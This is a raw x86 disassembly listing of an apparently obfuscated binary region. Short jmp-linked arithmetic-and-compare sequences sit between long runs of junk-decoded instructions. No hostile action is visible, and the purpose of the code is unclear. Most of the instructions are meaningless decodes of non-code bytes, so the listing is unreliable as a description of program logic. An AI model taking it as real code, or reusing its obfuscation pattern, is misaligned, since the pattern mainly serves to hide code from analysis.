  409a5e:	bound  edx,QWORD PTR [eax-0x30d13280]
  409a64:	mov    edx,DWORD PTR [edi+0x4]
  409a67:	jmp    0x409b3f
  409a6c:	or     eax,0xbf9f9cb2
  409a71:	mov    edi,0x880bb20f
  409a76:	adc    al,0x3f
  409a78:	sti    
  409a79:	cs jnp 0x409a1d
  409a7c:	neg    BYTE PTR [esi+0x0]
  409a7f:	add    BYTE PTR [ebx-0x2d000000],bh
  409a85:	and    cl,BYTE PTR [ecx+0x3c]
  409a88:	dec    ebx
  409a89:	or     ah,BYTE PTR [ecx]
  409a8b:	and    esp,DWORD PTR [esi+eiz*8-0x4646012b]
  409a92:	es sar DWORD PTR gs:[eax],0xd7
  409a97:	sbb    BYTE PTR [edi],dl
  409a99:	push   eax
  409a9a:	jecxz  0x409a25
  409a9c:	das    
  409a9d:	mov    esi,DWORD PTR [ebx-0x15]
  409aa0:	jmp    0x409a5c
  409aa2:	or     dl,BYTE PTR [edi]
  409aa4:	dec    ebp
  409aa5:	test   al,0xfe
  409aa7:	out    0x55,eax
  409aa9:	pop    edi
  409aaa:	sub    dh,dl
  409aac:	in     eax,dx
  409aad:	sbb    BYTE PTR [edx],0xcc
  409ab0:	outs   dx,DWORD PTR ds:[esi]
  409ab1:	and    al,0x2b
  409ab3:	loope  0x409a52
  409ab5:	mov    ecx,0x7690ce2
  409aba:	std    
  409abb:	fldenv [edx+esi*4]
  409abe:	push   ecx
  409abf:	jl     0x409af1
  409ac1:	jo     0x409a5c
  409ac3:	test   al,0xd3
  409ac5:	dec    ebx
  409ac6:	cli    
  409ac7:	dec    esp
  409ac8:	xor    eax,0x2f510d3
  409acd:	add    dl,0x45
  409ad0:	cli    
  409ad1:	std    
  409ad2:	retf   
  409ad3:	inc    esp
  409ad4:	dec    ecx
  409ad5:	push   eax
  409ad6:	mov    DWORD PTR [edx+0x78],eax
  409ad9:	xor    al,dl
  409adb:	in     al,0x80
  409add:	xor    eax,0xfcd199ab
  409ae2:	and    BYTE PTR ds:0x830c5b09,0x82
  409ae9:	mov    eax,ds:0x1d3d79b0
  409aee:	sbb    eax,0xbbedb944
  409af3:	mov    ebp,0x2bd14eba
  409af8:	and    BYTE PTR [edi+0x4c9e1037],dh
  409afe:	test   DWORD PTR ds:0x385e7f72,esi
  409b04:	xlat   BYTE PTR ds:[ebx]
  409b05:	bound  edi,QWORD PTR [edx]
  409b07:	outs   dx,DWORD PTR ds:[esi]
  409b08:	sti    
  409b09:	push   esi
  409b0a:	leave  
  409b0b:	sbb    DWORD PTR [ecx-0x34659d0d],ecx
  409b11:	aam    0xdd
  409b13:	call   0x262624f3
  409b18:	and    DWORD PTR [edi-0x3b05dd4f],edx
  409b1e:	sbb    al,0x76
  409b20:	(bad)  
  409b21:	jecxz  0x409b2f
  409b23:	test   al,0xc1
  409b25:	xor    DWORD PTR [ecx+0x1f],eax
  409b28:	in     al,0x3b
  409b2a:	xor    esi,DWORD PTR [edi]
  409b2c:	out    dx,al
  409b2d:	add    bh,BYTE PTR [esi+0x2]
  409b30:	icebp  
  409b31:	test   al,0xb4
  409b33:	retf   0xc283
  409b36:	and    dl,BYTE PTR ds:0x4c7772ba
  409b3c:	hlt    
  409b3d:	jne    0x409ad1
  409b3f:	xor    edx,ebx
  409b41:	jmp    0x409c19
  409b46:	call   0x6418fd16
  409b4b:	cli    
  409b4c:	stc    
  409b4d:	sti    
  409b4e:	push   ebx
  409b4f:	jecxz  0x409bc4
  409b51:	add    bh,BYTE PTR [ecx]
  409b53:	mov    ch,0x99
  409b55:	aas    
  409b56:	mov    cl,0x5f
  409b58:	add    BYTE PTR [eax],al
  409b5a:	mov    ebx,0xfa000000
  409b5f:	call   0xeb36e42c
  409b64:	hlt    
  409b65:	cmp    edx,DWORD PTR [ebx]
  409b67:	ss mov esi,0x1b59f5f7
  409b6d:	(bad)  
  409b6e:	bound  ebx,QWORD PTR [ebp-0x6635a8f8]
  409b74:	or     dh,BYTE PTR [ecx+0x41b94dec]
  409b7a:	xor    DWORD PTR ds:0x357e88fc,ebx
  409b80:	imul   ebp,DWORD PTR [ebx-0x51],0x10
  409b84:	adc    ah,0xbc
  409b87:	mov    bh,0x8c
  409b89:	cmp    ch,BYTE PTR [ecx+ebp*1]
  409b8c:	mov    edi,0xc9530d6d
  409b91:	popa   
  409b92:	jge    0x409b21
  409b94:	push   0xb71e7287
  409b99:	push   es
  409b9a:	sbb    eax,0x2f270d8
  409b9f:	and    al,0x76
  409ba1:	rcr    BYTE PTR [ebx+edi*2-0x601a4a56],cl
  409ba8:	cmp    al,0xbd
  409baa:	imul   edx,DWORD PTR [eax+0x3b5056c],0xffffffc9
  409bb1:	push   ds
  409bb2:	faddp  st(0),st
  409bb4:	push   ebp
  409bb5:	jecxz  0x409bb5
  409bb7:	mov    esi,0x165b761a
  409bbc:	adc    edx,DWORD PTR [bp+di-0x296b]
  409bc1:	mov    ecx,0xc58d372e
  409bc6:	repz sub BYTE PTR [ecx-0x23ea3170],bl
  409bcd:	out    0x15,al
  409bcf:	in     eax,dx
  409bd0:	std    
  409bd1:	mov    ebp,0xa6944dd8
  409bd6:	push   es
  409bd7:	push   cs
  409bd8:	fnstcw WORD PTR [ecx-0x316c1e2a]
  409bde:	jnp    0x409b7c
  409be0:	pop    es
  409be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409be2:	jnp    0x409b6a
  409be4:	inc    ebx
  409be5:	cs (bad) 
  409be7:	jne    0x409c14
  409be9:	push   edi
  409bea:	ins    BYTE PTR es:[edi],dx
  409beb:	shr    DWORD PTR [edi+ebx*4],cl
  409bee:	adc    BYTE PTR [ecx-0x4120777d],bl
  409bf4:	call   0xa037fd53
  409bf9:	mov    eax,ds:0x31dab3d3
  409bfe:	out    dx,al
  409bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c00:	adc    BYTE PTR [ecx],bh
  409c02:	add    DWORD PTR [ebp+0x6fac2fa4],0x74
  409c09:	outs   dx,DWORD PTR ds:[esi]
  409c0a:	add    bl,dh
  409c0c:	and    ebp,DWORD PTR [ebp+0xb]
  409c0f:	sbb    al,0x39
  409c11:	inc    eax
  409c12:	mov    ebx,0x1834f57e
  409c17:	jno    0x409c2f
  409c19:	xor    eax,esi
  409c1b:	jmp    0x409cf3
  409c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c21:	xchg   edx,eax
  409c22:	leave  
  409c23:	imul   edi,ebp,0xc4dfa67b
  409c29:	cmp    BYTE PTR [eax+0x7110a339],bl
  409c2f:	fisubr DWORD PTR [eax+eiz*2+0x0]
  409c33:	add    BYTE PTR [ebx+0x18000000],bh
  409c39:	pop    ebx
  409c3a:	adc    cl,BYTE PTR [esp+eax*4-0x1754b419]
  409c41:	sti    
  409c42:	mov    ebx,0x62834bb2
  409c47:	jae    0x409c1d
  409c49:	mov    eax,ds:0xb174cbad
  409c4e:	pop    esi
  409c4f:	lock mov al,ds:0x11884829
  409c55:	ds jg  0x409c34
  409c58:	xchg   eax,esp
  409c5a:	or     eax,edi
  409c5c:	jle    0x409caf
  409c5e:	lock mov ebx,0xa8cf7e70
  409c64:	sub    dh,BYTE PTR [ebp+ebx*1+0x127355c3]
  409c6b:	adc    dh,BYTE PTR [edi]
  409c6d:	xchg   ch,ch
  409c6f:	dec    ecx
  409c70:	xor    al,0x54
  409c72:	loop   0x409cc5
  409c74:	sub    bh,BYTE PTR [ebp+0x48]
  409c77:	mov    dh,0x96
  409c79:	pusha  
  409c7a:	js     0x409c38
  409c7c:	cmp    eax,0x3981484e
  409c81:	sub    DWORD PTR [edx],ebp
  409c83:	aam    0x61
  409c85:	push   0x172f1209
  409c8a:	sbb    ebp,eax
  409c8c:	pop    es
  409c8d:	xchg   esp,eax
  409c8e:	jbe    0x409c35
  409c90:	addr16 mov ah,0xd4
  409c93:	pop    ebx
  409c94:	cmp    ah,BYTE PTR [edi+ecx*2+0x1716fd51]
  409c9b:	fucomip st,st(5)
  409c9d:	outs   dx,DWORD PTR ds:[esi]
  409c9e:	or     al,0x93
  409ca0:	sub    esi,edx
  409ca2:	or     eax,0x2be4c294
  409ca7:	and    al,0x83
  409ca9:	mov    edi,0x7da738e2
  409cae:	sbb    al,dl
  409cb0:	xor    DWORD PTR [ecx-0x4ff2e14c],eax
  409cb6:	(bad)  
  409cb8:	push   esi
  409cb9:	xchg   al,al
  409cbb:	mov    al,ds:0x74cab645
  409cc0:	cmp    eax,0xb8806f08
  409cc5:	and    edi,DWORD PTR ds:0x8061df98
  409ccb:	fdivr  QWORD PTR [ecx-0x66070fc1]
  409cd1:	xor    BYTE PTR [edi-0x28e555db],0xff
  409cd8:	sbb    esi,DWORD PTR [ecx+ebp*2-0x2c38c618]
  409cdf:	inc    eax
  409ce0:	les    edx,FWORD PTR [ebx-0x78f9ea3b]
  409ce6:	aad    0xb0
  409ce8:	jl     0x409cd5
  409cea:	push   ds
  409ceb:	inc    di
  409ced:	sbb    cl,BYTE PTR [edx+ebx*1]
  409cf0:	fwait
  409cf1:	push   esi
  409cf2:	ss add eax,0x99b8624d
  409cf8:	adc    edx,0x8ddc
  409cfe:	jmp    0x409dd6
  409d03:	adc    dl,BYTE PTR [edx]
  409d05:	ret    0xc2c7
  409d08:	xlat   BYTE PTR ds:[ebx]
  409d09:	pop    ss
  409d0a:	xlat   BYTE PTR ds:[ebx]
  409d0b:	jl     0x409d58
  409d0d:	stos   BYTE PTR es:[edi],al
  409d0e:	in     al,0x65
  409d10:	ins    DWORD PTR es:[edi],dx
  409d11:	fild   QWORD PTR [esi+0x27]
  409d14:	popa   
  409d15:	add    BYTE PTR [eax],al
  409d17:	mov    ebx,0xa3000000
  409d1c:	lahf   
  409d1d:	gs call 0xa0c7:0x583052f6
  409d25:	cmp    DWORD PTR [ecx-0x10327e8c],ebx
  409d2b:	repz fstp TBYTE PTR [ebx+0x297bbf8c]
  409d32:	das    
  409d33:	fild   WORD PTR [ebx-0x4b]
  409d36:	mov    al,0x9
  409d38:	mov    ebp,0x96da2cd8
  409d3d:	sub    DWORD PTR [ecx-0x4b],ebx
  409d40:	mov    bl,0x66
  409d42:	icebp  
  409d43:	xchg   ebp,eax
  409d44:	fwait
  409d45:	pop    edi
  409d46:	mov    ebx,0x9b22e6d0
  409d4b:	clc    
  409d4c:	ret    0x9fd5
  409d4f:	sti    
  409d50:	dec    esp
  409d51:	jmp    0xf882:0x67a6d820
  409d58:	jmp    DWORD PTR [edi-0x4d745590]
  409d5e:	into   
  409d5f:	sub    eax,0x8b1d3017
  409d64:	shl    DWORD PTR [esi],cl
  409d66:	jg     0x409dd9
  409d68:	push   ecx
  409d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d6a:	ret    0x6642
  409d6d:	stos   BYTE PTR es:[edi],al
  409d6e:	ret    0x4924
  409d71:	inc    ebp
  409d72:	int    0xaa
  409d74:	cmp    al,0xa2
  409d76:	imul   ecx,DWORD PTR [ebp-0x4],0xe468bb1a
  409d7d:	stos   BYTE PTR es:[edi],al
  409d7e:	inc    eax
  409d7f:	mov    dh,0x9f
  409d81:	mov    BYTE PTR [edi-0x11],cl
  409d84:	add    DWORD PTR [ebp-0xce415e4],0x51
  409d8b:	ds and al,0x17
  409d8e:	xchg   ecx,eax
  409d8f:	xchg   ebp,eax
  409d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d91:	mov    cl,0x52
  409d93:	ja     0x409da7
  409d95:	push   ds
  409d96:	push   ss
  409d97:	lock mov DWORD PTR [ebx],esi
  409d9a:	dec    ecx
  409d9b:	mov    eax,ds:0x20718fb8
  409da0:	lahf   
  409da1:	in     al,0xf1
  409da3:	pop    esi
  409da4:	ins    DWORD PTR es:[edi],dx
  409da5:	jb     0x409dea
  409da7:	jmp    0x1e306f9d
  409dac:	add    bh,BYTE PTR [esi]
  409dae:	iret   
  409daf:	mov    eax,0x2a6909e4
  409db4:	xchg   esp,eax
  409db5:	arpl   WORD PTR [ecx],ax
  409db7:	lods   al,BYTE PTR ds:[esi]
  409db8:	cmp    BYTE PTR [eax+0x60b2a9cf],cl
  409dbe:	retf   
  409dbf:	sub    edx,DWORD PTR [ebx]
  409dc1:	sar    BYTE PTR [edx+0x6e],1
  409dc4:	es gs jmp 0x409e0d
  409dc8:	test   al,0xbc
  409dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dcb:	jnp    0x409d98
  409dcd:	ret    0x9837
  409dd0:	push   edx
  409dd1:	shr    BYTE PTR [esi],cl
  409dd3:	shl    BYTE PTR [ecx+0x8458995],1
  409dd9:	jmp    0x409eb1
  409dde:	nop
  409ddf:	stos   BYTE PTR es:[edi],al
  409de0:	mov    edi,0x913fbf3e
  409de5:	scas   al,BYTE PTR es:[edi]
  409de6:	lds    ecx,FWORD PTR [ebp-0x2d]
  409de9:	or     eax,0x5ffa8569
  409dee:	loop   0x409e51
  409df0:	add    BYTE PTR [eax],al
  409df2:	mov    ebx,0x4c000000
  409df7:	jno    0x409e56
  409df9:	push   0x50413976
  409dfe:	sub    DWORD PTR [eax+0x7676d692],ebp
  409e04:	pop    edi
  409e05:	cmp    edi,DWORD PTR [ecx+eax*4-0x294bd833]
  409e0c:	xor    eax,0x4c3809cf
  409e11:	pushf  
  409e12:	mov    ah,0x9
  409e14:	jp     0x409e09
  409e16:	adc    BYTE PTR [ebx],cl
  409e18:	xor    eax,0x2b23bfc9
  409e1d:	dec    esp
  409e1e:	les    ebp,FWORD PTR [eax+0x15f4e20e]
  409e24:	mov    dh,0xea
  409e26:	sub    eax,0x21e13978
  409e2b:	xor    eax,0x243716fa
  409e30:	call   0x2732:0x30d384c4
  409e37:	cs std 
  409e39:	sub    al,0xfa
  409e3b:	leave  
  409e3c:	mov    dh,0xd0
  409e3e:	test   eax,0xd62399c5
  409e43:	int    0xc9
  409e45:	sub    cl,BYTE PTR [edx+0xef5b72c]
  409e4b:	push   ebp
  409e4c:	mov    ?,WORD PTR [esp+esi*8]
  409e4f:	rcl    cl,0xf8
  409e52:	push   edx
  409e53:	xlat   BYTE PTR ds:[ebx]
  409e54:	mov    cl,0x70
  409e56:	repz pop esi
  409e58:	fsubp  st(6),st
  409e5a:	add    al,0x36
  409e5c:	pushf  
  409e5d:	es mov ebx,0xecac54ae
  409e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e64:	lock data16 xor BYTE PTR [eax-0x70],0x53
  409e6a:	pop    edi
  409e6b:	loope  0x409e4e
  409e6d:	aad    0x4e
  409e6f:	sub    BYTE PTR ds:0xdbab12a6,bh
  409e75:	loop   0x409e57
  409e77:	cld    
  409e78:	(bad)  
  409e79:	and    eax,0x752e03de
  409e7e:	jp     0x409e9e
  409e80:	call   0xf028:0xae73c633
  409e87:	aam    0x17
  409e89:	aad    0x9c
  409e8b:	fcmovnb st,st(6)
  409e8d:	clc    
  409e8e:	push   sp
  409e90:	retf   
  409e91:	jne    0x409e77
  409e93:	sahf   
  409e94:	cmp    al,0x77
  409e96:	xor    DWORD PTR ds:0x46e4dc4,esp
  409e9c:	or     BYTE PTR [eax],dl
  409e9e:	dec    ebp
  409e9f:	fcomp  QWORD PTR [eax-0x578477bf]
  409ea5:	adc    DWORD PTR [esi-0x8],ecx
  409ea8:	lods   al,BYTE PTR ds:[esi]
  409eaa:	mov    dh,0xed
  409eac:	std    
  409ead:	jae    0x409ef5
  409eaf:	jmp    0x409e66
  409eb1:	mov    eax,DWORD PTR [ecx]
  409eb3:	jmp    0x409f8b
  409eb8:	mov    BYTE PTR [ebx+0x38],bl
  409ebb:	jne    0x409eb8
  409ebd:	ja     0x409e8c
  409ebf:	call   FWORD PTR [ebx-0x5f]
  409ec2:	(bad)  [ebp+0x40]
  409ec5:	inc    edx
  409ec6:	push   ecx
  409ec7:	aas    
  409ec8:	popf   
  409ec9:	bound  eax,QWORD PTR [eax]
  409ecb:	add    BYTE PTR [ebx+0x59000000],bh
  409ed1:	mov    esi,0xe29bff29
  409ed6:	ret    0xfce6
  409ed9:	out    0x18,al
  409edb:	mov    WORD PTR [edi],gs
  409edd:	jmp    0x8ac588cb
  409ee2:	or     al,BYTE PTR [esi+0x4d]
  409ee5:	push   edi
  409ee6:	pop    es
  409ee7:	fcom   QWORD PTR [ebx-0x32704bcb]
  409eed:	jnp    0x409e88
  409eef:	mov    esp,0xbbbb17ce
  409ef4:	jl     0x409f53
  409ef6:	mov    eax,ds:0x41fc4084
  409efb:	and    DWORD PTR [eax],esi
  409efd:	aam    0xe4
  409eff:	jmp    0x1f03:0x3b826c55
  409f06:	push   ecx
  409f07:	cs ins BYTE PTR es:[edi],dx
  409f09:	cmp    bh,BYTE PTR [ecx-0x4d]
  409f0c:	xchg   ebx,eax
  409f0d:	jne    0x409f66
  409f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f10:	pusha  
  409f11:	pop    ebx
  409f12:	jns    0x409f83
  409f14:	mov    ebx,0xc2ea31a5
  409f19:	out    0x72,eax
  409f1b:	add    cl,BYTE PTR [ecx]
  409f1d:	aam    0xcc
  409f1f:	xor    eax,0xcb5b2b1b
  409f24:	cmp    BYTE PTR [ecx-0x43],dh
  409f27:	gs or  eax,0x49fd39b5
  409f2d:	or     esi,DWORD PTR [ebx+0x4ae170e7]
  409f33:	inc    ebp
  409f34:	in     al,0x78
  409f36:	mov    ch,0xa
  409f38:	xor    eax,0xa32b5e9b
  409f3d:	(bad)  
  409f3e:	or     DWORD PTR [eax+esi*2-0x287c6a8d],ebx
  409f45:	lea    ebx,gs:[eax+eax*4]
  409f49:	mov    DWORD PTR [ebx],esi
  409f4b:	jmp    0x81fb:0x2e282d9b
  409f52:	or     BYTE PTR [esi],cl
  409f54:	cwde   
  409f55:	stos   DWORD PTR es:[edi],eax
  409f56:	das    
  409f57:	and    BYTE PTR [esi+0x69],dh
  409f5a:	enter  0xab7f,0xd6
  409f5e:	out    dx,al
  409f5f:	clc    
  409f60:	and    DWORD PTR [ebx+edx*4+0x34fa1b84],edx
  409f67:	jnp    0x409f58
  409f69:	push   ebx
  409f6a:	xchg   edi,eax
  409f6b:	xor    DWORD PTR [esi],esi
  409f6d:	arpl   WORD PTR [edi+ebp*1-0x4893e008],bx
  409f74:	test   eax,0xfb60d759
  409f79:	mov    ds:0x9ffe84bd,eax
  409f7e:	pop    edx
  409f7f:	or     al,0xe7
  409f81:	add    al,0x70
  409f83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f85:	out    dx,eax
  409f86:	fsub   DWORD PTR [esi-0x5]
  409f89:	xchg   edx,eax
  409f8a:	xchg   edi,eax
  409f8b:	mov    DWORD PTR [ebp+0xc],edx
  409f8e:	mov    edx,DWORD PTR [ecx+0x4]
  409f91:	xor    eax,esi
  409f93:	xor    edx,ebx
  409f95:	add    eax,0x99b8624d
  409f9a:	adc    edx,0x8ddc
  409fa0:	mov    DWORD PTR [ebp+0x1c],edx
  409fa3:	cmp    DWORD PTR [ebp+0x8],eax
  409fa6:	jne    0x40ab43
  409fac:	mov    eax,edx
  409fae:	cmp    DWORD PTR [ebp+0xc],eax
  409fb1:	jne    0x40ab43
  409fb7:	jmp    0x40a35b
  409fbc:	mov    eax,DWORD PTR [edi]
  409fbe:	mov    edx,DWORD PTR [edi+0x4]
  409fc1:	jmp    0x40a099
  409fc6:	pop    eax
  409fc8:	push   ebx
  409fc9:	out    dx,al
  409fca:	pop    edi
  409fcb:	(bad)  
  409fcc:	mov    edi,0x928a79e1
  409fd1:	mov    eax,ds:0xe4e44382
  409fd6:	pop    eax
  409fd7:	arpl   WORD PTR [eax],ax
  409fd9:	add    BYTE PTR [ebx-0x2f000000],bh
  409fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe0:	push   eax
  409fe1:	xchg   ebx,eax
  409fe2:	sti    
  409fe3:	or     al,0x6b
  409fe5:	dec    eax
  409fe6:	mov    ebx,0xa451a56b
  409feb:	iret   
  409fec:	mov    ds:0x934cf97d,al
  409ff1:	xor    ebp,0xffffff81
  409ff4:	xchg   ebx,eax
  409ff5:	out    dx,al
  409ff6:	sub    al,0x99
  409ff8:	in     al,0x6a
  409ffa:	sub    eax,0x232b2c91
  409fff:	xchg   ecx,eax
  40a000:	jne    0x40a039
  40a002:	jecxz  0x40a058
  40a004:	shr    ebx,cl
  40a006:	popf   
  40a007:	xchg   esp,eax
  40a008:	push   ds
  40a009:	and    ebx,ecx
  40a00b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a00c:	imul   edi,ebp,0x32db2b67
  40a012:	add    eax,0x4a418940
  40a017:	lds    eax,FWORD PTR [ebx+0x29]
  40a01a:	adc    ecx,DWORD PTR [eax+0x47]
  40a01d:	mov    ebx,edi
  40a01f:	mov    edi,0x22a05ccd
  40a024:	fdivr  DWORD PTR [edx+0x72cf3bd8]
  40a02a:	inc    edi
  40a02b:	ds retf 0xfbb
  40a02f:	cmc    
  40a030:	push   esi
  40a031:	stos   DWORD PTR es:[edi],eax
  40a032:	call   0x6419a44a
  40a037:	mov    bh,bh
  40a039:	packsswb mm1,QWORD PTR [ebx-0x2b]
  40a03d:	call   0xafcf4b17
  40a042:	inc    esp
  40a043:	jle    0x40a0b0
  40a045:	adc    BYTE PTR [ecx+0x76],0x4c
  40a049:	sbb    al,0xa9
  40a04b:	mov    esi,0xd99192ba
  40a050:	jne    0x40a079
  40a052:	xchg   ecx,eax
  40a053:	repz in al,0x78
  40a056:	push   ss
  40a057:	adc    al,0x36
  40a059:	cdq    
  40a05a:	pop    ds
  40a05b:	push   es
  40a05c:	fcmovbe st,st(7)
  40a05e:	sbb    al,0x9a
  40a060:	call   0x1e69:0x6b108fbd
  40a067:	pop    edx
  40a068:	dec    ecx
  40a069:	add    BYTE PTR [esi],al
  40a06b:	cli    
  40a06c:	xor    eax,esi
  40a06e:	mov    al,ds:0x7dd88585
  40a073:	xor    eax,ebx
  40a075:	adc    al,0xc8
  40a077:	call   0x1f4b2376
  40a07c:	inc    esi
  40a07d:	test   eax,0x666dd2ea
  40a082:	(bad)  
  40a083:	mov    edi,0x29c4e987
  40a088:	mov    esp,0xff038139
  40a08d:	or     eax,DWORD PTR [edi-0x6f38f79]
  40a093:	xor    eax,0x5f6a5dd5
  40a098:	cmp    al,0x33
  40a09a:	(bad)  
  40a09b:	xor    edx,ebx
  40a09d:	add    eax,0x99b8624d
  40a0a2:	mov    DWORD PTR [ebp+0x8],eax
  40a0a5:	mov    eax,edx
  40a0a7:	mov    edx,DWORD PTR [ecx]
  40a0a9:	mov    ecx,DWORD PTR [ecx+0x4]
  40a0ac:	adc    eax,0x8ddc
  40a0b1:	push   eax
  40a0b2:	jmp    0x40a18a
  40a0b7:	cmp    dh,BYTE PTR ds:0xf3af62a4
  40a0bd:	(bad)  
  40a0be:	jge    0x40a0f6
  40a0c0:	ror    BYTE PTR [eax],1
  40a0c2:	xor    edi,DWORD PTR [ebx+0x41]
  40a0c5:	icebp  
  40a0c6:	or     eax,0x6413
  40a0cb:	mov    ebx,0xc1000000
  40a0d0:	sub    eax,0x1e34d734
  40a0d5:	in     al,0x1c
  40a0d7:	push   ds
  40a0d8:	fstp   QWORD PTR [ebx-0x3c]
  40a0db:	aad    0xcd
  40a0dd:	in     al,dx
  40a0de:	pop    esi
  40a0df:	xor    al,cl
  40a0e1:	mov    al,0x84
  40a0e3:	and    edx,edi
  40a0e5:	sbb    ebx,DWORD PTR [ebx+eax*2]
  40a0e8:	mov    eax,ds:0x7ec5f42f
  40a0ed:	inc    ecx
  40a0ee:	or     eax,0xa70185ae
  40a0f3:	xor    BYTE PTR [edx],bh
  40a0f5:	fyl2x  
  40a0f7:	push   es
  40a0f8:	xchg   esp,eax
  40a0f9:	std    
  40a0fa:	xchg   ecx,eax
  40a0fb:	arpl   WORD PTR [ecx+0x4ed28db],cx
  40a101:	lods   al,BYTE PTR ds:[esi]
  40a102:	xor    eax,0xfd683d38
  40a107:	xlat   BYTE PTR ds:[ebx]
  40a108:	or     eax,0xa9ca55d9
  40a10d:	rcl    BYTE PTR [eax-0x3ef433f2],0x2f
  40a114:	or     ah,BYTE PTR [edx+0x74186581]
  40a11a:	mov    ebp,0x9bd3ab7c
  40a11f:	ret    
  40a120:	xor    al,0x11
  40a122:	idiv   ecx
  40a124:	mov    esp,0x81601d96
  40a129:	push   eax
  40a12a:	pop    eax
  40a12b:	sti    
  40a12c:	sbb    al,0x97
  40a12e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a12f:	test   eax,0x7465bb91
  40a134:	aaa    
  40a135:	xchg   esp,eax
  40a136:	out    0x5b,eax
  40a138:	sub    eax,0x5a306e93
  40a13d:	xor    DWORD PTR [edx],esi
  40a13f:	imul   edi,ecx,0xfffffffb
  40a142:	dec    ebp
  40a143:	xchg   esi,eax
  40a144:	mov    ds:0xb846f863,eax
  40a149:	or     DWORD PTR [eax+eax*4+0x139a2f80],0x30
  40a151:	adc    cl,BYTE PTR [ebp-0x195f8866]
  40a157:	mov    WORD PTR [ebp+0x33],ds
  40a15a:	and    BYTE PTR ds:0xc64f1754,dh
  40a160:	rol    esp,0xb
  40a163:	mov    esi,ebp
  40a165:	pop    ebx
  40a166:	or     al,0xe4
  40a168:	push   ecx
  40a169:	lea    esp,[ecx]
  40a16b:	xchg   DWORD PTR [edi+0x6a],ecx
  40a16e:	push   0xbeb47306
  40a173:	xbegin 0xf590ed53
  40a179:	loopne 0x40a144
  40a17b:	gs jno 0x40a15b
  40a17e:	lds    edi,FWORD PTR ds:0x7ecb49aa
  40a184:	mov    edi,0xeeddf5dd
  40a189:	fdivp  st(7),st
  40a18b:	jne    0x40a195
  40a18d:	push   ecx
  40a18e:	push   edx
  40a18f:	call   0x42eace
  40a194:	jmp    0x40a26c
  40a199:	lods   al,BYTE PTR ds:[esi]
  40a19a:	xchg   edi,eax
  40a19b:	int    0x96
  40a19d:	(bad)  
  40a19e:	fdivp  st(7),st
  40a1a0:	mov    edi,0xe47d9b3d
  40a1a5:	pop    ebp
  40a1a6:	jns    0x40a148
  40a1a8:	pop    edi
  40a1a9:	into   
  40a1aa:	add    BYTE PTR fs:[eax],al
  40a1ad:	mov    ebx,0xfa000000
  40a1b2:	loop   0x40a182
  40a1b4:	pusha  
  40a1b5:	pushf  
  40a1b6:	pop    es
  40a1b7:	mov    al,0x70
  40a1b9:	and    bl,BYTE PTR [ebp+0x35008b54]
  40a1bf:	and    eax,0x1e3d72a
  40a1c4:	xor    al,0x50
  40a1c6:	sbb    ch,dh
  40a1c8:	outs   dx,BYTE PTR ds:[esi]
  40a1c9:	int3   
  40a1ca:	fbstp  TBYTE PTR [esi+edx*8]
  40a1cd:	lea    ebx,[edi-0xe51325e]
  40a1d3:	arpl   WORD PTR [ecx-0x7e63d6d6],bp
  40a1d9:	mov    dl,0xb4
  40a1db:	dec    edx
  40a1dc:	pop    eax
  40a1dd:	fadd   st,st(6)
  40a1df:	xor    BYTE PTR [esi+0x3bd98965],dh
  40a1e5:	fcom   QWORD PTR [eax]
  40a1e7:	adc    al,0x89
  40a1e9:	jnp    0x40a1af
  40a1eb:	sbb    eax,0x7ceb3c72
  40a1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1f1:	adc    eax,0x51027f20
  40a1f6:	fs fs mov ebx,0x7ae9c213
  40a1fd:	sbb    eax,esp
  40a1ff:	sub    DWORD PTR [ebp-0x240e5332],ebp
  40a205:	popf   
  40a206:	or     eax,0x10b07a0f
  40a20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20c:	inc    ebx
  40a20d:	jl     0x40a26b
  40a20f:	and    eax,0x9c748928
  40a214:	repnz push 0x2e11b3e7
  40a21a:	hlt    
  40a21b:	pop    edi
  40a21c:	cdq    
  40a21d:	jnp    0x40a22d
  40a21f:	push   ebp
  40a220:	push   ss
  40a221:	mov    fs,WORD PTR [eax+0xd]
  40a224:	pushf  
  40a225:	js     0x40a207
  40a227:	outs   dx,BYTE PTR ds:[esi]
  40a228:	jg     0x40a24b
  40a22a:	mov    ebx,0xdf4fc61b
  40a22f:	jbe    0x40a249
  40a231:	add    eax,DWORD PTR [edx+esi*1-0x30]
  40a235:	xchg   esi,eax
  40a236:	jle    0x40a26b
  40a238:	and    DWORD PTR [edx+0x5377a965],edx
  40a23e:	dec    edx
  40a23f:	jne    0x40a27f
  40a241:	cmp    eax,0x75cc5222
  40a246:	pop    esi
  40a247:	adc    BYTE PTR [edx],0xf4
  40a24a:	push   esp
  40a24b:	in     al,0x91
  40a24d:	loop   0x40a21f
  40a24f:	ret    0xa1e8
  40a252:	push   ds
  40a253:	add    al,0x62
  40a255:	test   esp,edi
  40a257:	leave  
  40a258:	sub    bh,BYTE PTR [eax-0x39]
  40a25b:	push   edx
  40a25c:	imul   edi,DWORD PTR [ecx+0x165fe7eb],0xffffff87
  40a263:	add    edx,DWORD PTR [esi]
  40a265:	mov    al,ds:0x4d2ac01e
  40a26a:	mov    dh,0x9b
  40a26c:	add    eax,0x66479db3
  40a271:	adc    edx,0xffff7223
  40a277:	xor    eax,esi
  40a279:	mov    DWORD PTR [edi],eax
  40a27b:	mov    ecx,DWORD PTR [ebp+0x14]
  40a27e:	xor    edx,ebx
  40a280:	jmp    0x40a358
  40a285:	cmc    
  40a286:	jae    0x40a22c
  40a288:	cld    
  40a289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28a:	(bad)  
  40a28b:	std    
  40a28c:	jnp    0x40a269
  40a28e:	out    0xd1,eax
  40a290:	lahf   
  40a291:	push   ecx
